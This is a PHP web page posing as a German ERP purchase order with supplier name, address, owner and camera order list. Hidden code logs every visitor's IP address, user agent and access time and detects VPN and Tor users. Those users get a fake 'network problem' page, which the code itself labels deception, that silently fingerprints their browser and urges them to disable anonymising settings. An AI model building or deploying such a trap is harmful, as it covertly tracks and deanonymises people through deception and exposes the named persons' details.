<?php
// Datei für Logs
$logfile = __DIR__ . '/client_data.txt';

// Funktion zur Überprüfung auf TOR-Exit-Nodes
function is_tor_exit_node($ip) {
    $reversed_ip = implode('.', array_reverse(explode('.', $ip)));
    $dns_query = $reversed_ip . ".dnsel.torproject.org";
    return checkdnsrr($dns_query, "A");
}

// Funktion zur VPN-Erkennung über IP-API
function is_vpn_ip($ip) {
    $api_url = "http://ip-api.com/json/{$ip}?fields=status,message,proxy";
    $response = @file_get_contents($api_url);
    if ($response) {
        $data = json_decode($response, true);
        return isset($data['proxy']) && $data['proxy'] === true;
    }
    return false;
}

// Verarbeitung von JavaScript-Daten
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['js_data'])) {
    $js_data = json_decode($_POST['js_data'], true);
    if ($js_data) {
        $log_data = "JavaScript-Data:\n";
        foreach ($js_data as $key => $value) {
            $log_data .= ucfirst($key) . ": $value\n";
        }
        file_put_contents($logfile, $log_data . "---------------------\n", FILE_APPEND | LOCK_EX);
    }
    exit(); // Kein weiterer Inhalt wird gesendet
}

// Routing-Logik: Prüfen, ob es ein "Retry"-Request ist
if (isset($_GET['action']) && $_GET['action'] === 'retry') {
    $ip_address = $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'];
    $is_vpn = is_vpn_ip($ip_address);
    $is_tor = is_tor_exit_node($ip_address);

    echo "<!DOCTYPE html>
<html lang='de'>
<head>
    <meta charset='UTF-8'>
    <title>Netzwerkprüfung</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
        h1 {
            color: " . ($is_vpn || $is_tor ? '#c00' : '#0c0') . ";
        }
        p {
            font-size: 18px;
        }
        a {
            color: #0066cc;
            text-decoration: none;
            font-weight: bold;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <h1>" . ($is_vpn || $is_tor ? "Netzwerkproblem weiterhin erkannt" : "Netzwerkprüfung erfolgreich") . "</h1>
    <p>" . ($is_vpn || $is_tor
        ? "Es konnte weiterhin keine stabile Verbindung hergestellt werden. Bitte überprüfen Sie Ihre Netzwerkeinstellungen und versuchen Sie es erneut."
        : "Die Verbindung ist jetzt stabil. Willkommen zurück!") . "</p>
    <p><a href='./'>Zurück zur Startseite</a></p>
</body>
</html>";
    exit();
}

// Hauptprüfung: VPN/TOR erkennen und Fehlermeldung anzeigen
$ip_address = $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'];
$is_vpn = is_vpn_ip($ip_address);
$is_tor = is_tor_exit_node($ip_address);

// Ergebnisse loggen
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$access_time = date('Y-m-d H:i:s');
$log_data = "----------------------------\n";
$log_data .= "IP-Adresse: $ip_address\n";
$log_data .= "User-Agent: $user_agent\n";
$log_data .= "Zugriffszeit: $access_time\n";
$log_data .= "VPN erkannt: " . ($is_vpn ? "Ja" : "Nein") . "\n";
$log_data .= "TOR erkannt: " . ($is_tor ? "Ja" : "Nein") . "\n";
file_put_contents($logfile, $log_data, FILE_APPEND | LOCK_EX);

// Täuschung: Subtile Fehlermeldung
if ($is_vpn || $is_tor) {
    echo "<!DOCTYPE html>
<html lang='de'>
<head>
    <meta charset='UTF-8'>
    <title>Netzwerk-Überprüfung erforderlich</title>
    <script>
        window.onload = function() {
            const js_data = {
                screenResolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                browserLanguage: navigator.language,
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                cookiesEnabled: navigator.cookieEnabled ? 'Ja' : 'Nein',
                plugins: Array.from(navigator.plugins).map(p => p.name).join(', ')
            };

            const formData = new FormData();
            formData.append('js_data', JSON.stringify(js_data));

            fetch(window.location.href, {
                method: 'POST',
                body: formData
            });
        };
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
        h1 {
            color: #c00;
        }
        p {
            font-size: 18px;
        }
        a {
            color: #0066cc;
            text-decoration: none;
            font-weight: bold;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <h1>Verbindungsproblem festgestellt</h1>
    <p>Unsere Systeme haben ein Problem mit Ihrer Netzwerkverbindung erkannt.</p>
    <p>Bitte führen Sie eine Netzwerk-Überprüfung durch, um sicherzustellen, dass alle Verbindungen ordnungsgemäß funktionieren.</p>
    <p><a href='?action=retry'>Netzwerk-Überprüfung starten</a></p>
    <p><small>Hinweis: Für eine erfolgreiche Überprüfung sollten keine speziellen Netzwerkeinstellungen aktiv sein.</small></p>
</body>
</html>";
    exit();
}

// Wenn kein VPN/TOR erkannt wurde, Originalseite laden
?>
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ERP Einkaufssystem - 2T Videomarketing</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
        }
        header {
            background-color: #0a485b;
            color: #fff;
            padding: 20px;
            text-align: center;
        }
        nav {
            text-align: center;
            background-color: #0a485b;
            padding: 10px;
        }
        nav a {
            margin: 0 15px;
            color: #ff6f6f;
            text-decoration: none;
            font-weight: bold;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .info-box {
            background-color: #fff;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        footer {
            background-color: #0a485b;
            color: white;
            padding: 20px;
            text-align: center;
            margin-top: 40px;
        }
    </style>
</head>
<body>
    <header>
        <h1>ERP Einkaufssystem - 2T Videomarketing</h1>
    </header>
    <nav>
        <a href="#">Startseite</a>
        <a href="#">Produkte</a>
        <a href="#">Kontakt</a>
    </nav>
    <div class="container">
        <div class="info-box">
            <h2>Lieferanteninformationen</h2>
            <p><strong>Lieferant:</strong> Foto Mundus GmbH & Co. KG</p>
            <p><strong>Adresse:</strong> Döppers Kamp 4, 48531 Nordhorn</p>
            <p><strong>Inhaber:</strong> Lutz Bergknecht</p>
        </div>
        <div class="info-box">
            <h2>Bestellinformationen</h2>
            <ul>
                <li>Canon EOS 5D Mark IV Gehäuse - 2 Stück</li>
                <li>Nikon D780 Gehäuse Schwarz - 2 Stück</li>
                <li>Canon EOS 250D Gehäuse Schwarz - 5 Stück</li>
                <li>Canon RF 18-150mm F/3.5-6.3 IS STM - 3 Stück</li>
            </ul>
            <p><strong>Gesamtbetrag:</strong> 8.380,00 €</p>
        </div>
    </div>
    <footer>
        <p>© 2024 2T Videomarketing | ERP Einkaufssystem</p>
    </footer>
</body>
</html>
